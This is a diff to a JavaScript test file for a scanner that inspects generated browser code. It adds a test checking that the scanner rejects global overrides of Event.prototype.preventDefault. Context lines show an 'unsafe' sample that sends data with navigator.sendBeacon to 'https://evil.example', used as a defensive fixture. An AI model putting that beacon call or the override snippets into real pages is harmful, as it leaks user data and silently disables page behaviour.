@@ -162,6 +162,19 @@ test("security scan rejects undeclared network access", () => {
   assert.throws(() => scanGeneratedBuild(build, skill), /forbidden network/);
 });
 
+test("security scan rejects page-wide Event.preventDefault prototype replacement", () => {
+  for (const js of [
+    "Event.prototype.preventDefault = function () {};",
+    "Event.prototype['preventDefault'] = () => {};",
+    "Object.defineProperty(Event.prototype, 'preventDefault', { value() {} });"
+  ]) {
+    const build = parseGeneratedBuild(JSON.stringify({
+      modes: { standard: { js, css: "" } }
+    }), skill);
+    assert.throws(() => scanGeneratedBuild(build, skill), /global event cancellation override/);
+  }
+});
+
 test("capability-denial policy checks inspect candidate source", () => {
   const safe = { modes: { standard: { js: "document.body.dataset.ready = '1';" } } };
   const unsafe = { modes: { standard: { js: "navigator.sendBeacon('https://evil.example', 'x');" } } };
